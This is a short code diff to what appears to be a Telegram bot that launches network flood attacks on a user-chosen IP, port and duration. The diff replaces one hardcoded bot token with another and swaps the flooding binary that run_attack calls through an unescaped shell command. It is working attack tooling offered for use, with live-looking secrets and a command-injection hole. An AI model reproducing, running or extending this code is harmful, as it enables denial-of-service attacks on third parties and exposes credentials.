@@ -10,7 +10,7 @@ import random
 import string
 
 # Bot token
-BOT_TOKEN = '7960283920:AAFzeM_gX39c_-0ccCZGNim4273ujZzI7Go'  # Replace with your bot token
+BOT_TOKEN = '7718352742:AAEM94Q7mNMYFacmV3vjxTAtGSq2Zvmzi2A'  # Replace with your bot token
 
 # Admin ID
 ADMIN_ID = 1944182800
@@ -740,7 +740,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
     global current_attack_user, current_attack_end_time, attack_cooldown
 
     try:
-        command = f"./Spike {ip} {port} {time_duration} {512} {default_thread}"
+        command = f"./vpsbest {ip} {port} {time_duration} {9} {default_thread}"
         process = subprocess.Popen(command, shell=True)
 
         await asyncio.sleep(time_duration)
